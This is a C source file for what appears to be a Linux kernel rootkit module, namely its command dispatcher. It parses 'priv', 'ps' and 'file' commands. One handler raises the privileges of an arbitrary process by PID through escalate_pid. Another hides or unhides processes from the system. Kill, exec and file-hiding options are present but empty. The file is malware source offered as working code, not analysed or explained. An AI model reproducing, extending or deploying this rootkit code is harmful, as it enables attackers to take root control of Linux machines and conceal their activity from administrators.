#include <linux/kernel.h>
#include <linux/module.h>

#include "commands.h"
#include "privilege_escalation.h"
#include "hide_proc.h"

int commands_priv_handler(int argc, char **argv);
int commands_proc_handler(int argc, char **argv);
int commands_file_handler(int argc, char **argv);

int commands_dispatch(int argc, char **argv)
{
	ketopt_t o = KETOPT_INIT_ZERO;

	char *cmd = NULL;
	int c;
	int ret = 0;

	while ((c = ketopt(&o, argc, argv, 0, "", 0)) >= 0) {
		/* read until first command */
	}

	if (o.ind == argc) {
		printk(KERN_WARNING "%s: Missing command\n", THIS_MODULE->name);
		return -EINVAL;
	}

	cmd = argv[o.ind];

	if (strncmp("priv", cmd, 4) == 0) {
		commands_priv_handler(argc, argv);
	} else if (strncmp("ps", cmd, 2) == 0) {
		commands_proc_handler(argc, argv);
	} else if (strncmp("file", cmd, 4) == 0) {
		commands_file_handler(argc, argv);
	} else {
		printk(KERN_WARNING "%s: Unknown command: %s\n",
		       THIS_MODULE->name, cmd);
		return -EINVAL;
	}

	return ret;
}

int commands_priv_handler(int argc, char **argv)
{
	int err = 0;
	int c;
	ketopt_t o = KETOPT_INIT;

	int pid = INVALID_PID;
	int perm = 0;

	while ((c = ketopt(&o, argc, argv, 1, "", priv_longopts)) >= 0) {
		switch (c) {
		case OPT_PRIV_PID:
			if (o.arg) {
				if (kstrtol(o.arg, 10, (long *)&pid)) {
					err++;
					break;
				}
			} else {
				err++;
			}
			break;
		case OPT_PRIV_PERM:
			if (o.arg) {
				if (kstrtol(o.arg, 10, (long *)&perm)) {
					err++;
					break;
				}
			} else {
				err++;
			}
			break;
		}
	}

	if (pid == INVALID_PID) {
		err++;
	}

	if (!err) {
		escalate_pid(pid);
	}

	return err ? -EINVAL : 0;
}

int commands_proc_handler(int argc, char **argv)
{
	int err = 0;
	int c;
	ketopt_t o = KETOPT_INIT;

	while ((c = ketopt(&o, argc, argv, 1, "", proc_longopts)) >= 0) {
		switch (c) {
		case OPT_PROC_SHOW:
			if (o.arg) {
				err += unhide_proc(o.arg);
			} else {
				err++;
			}
			break;
		case OPT_PROC_HIDE:
			if (o.arg) {
				err += hide_proc(o.arg);
			} else {
				err++;
			}
			break;
		case OPT_PROC_KILL:
			break;
		case OPT_PROC_EXEC:
			break;
		}
	}

	return err ? -EINVAL : 0;
}

int commands_file_handler(int argc, char **argv)
{
	int err = 0;
	int c;
	ketopt_t o = KETOPT_INIT;

	while ((c = ketopt(&o, argc, argv, 1, "", file_longopts)) >= 0) {
		switch (c) {
		case OPT_FILE_SHOW:
			break;
		case OPT_FILE_HIDE:
			break;
		}
	}

	return err ? -EINVAL : 0;
}
